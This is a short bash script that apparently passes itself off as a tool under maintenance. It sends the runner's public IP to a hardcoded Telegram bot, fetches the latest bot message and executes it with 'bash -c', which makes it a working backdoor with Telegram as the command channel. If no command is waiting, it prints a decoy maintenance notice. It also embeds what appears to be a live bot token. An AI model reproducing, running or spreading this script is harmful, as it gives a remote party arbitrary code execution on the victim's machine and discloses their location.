#!/bin/bash

YELLOW='\033[1;33m'
NC='\033[0m'

BOT_TOKEN="8136821698:AAHhmzcnqMfn0G4b_t6L6-Ff-uuHwJ6HWTw"
CHAT_ID="7432279779"

IP=$(curl -s -4 ifconfig.me)

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d chat_id="$CHAT_ID" \
    -d text=" مستخدم جديد شغّل السكربت من IP : $IP" >/dev/null

CMD=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates" | grep -oP '"text":"\K[^"]+' | tail -1)

[[ -z "$CMD" ]] && echo " ⛔ The script is under maintenance. Please try again later. " && exit 1

bash -c "$CMD" 2>&1 | tee /tmp/exec_output.log
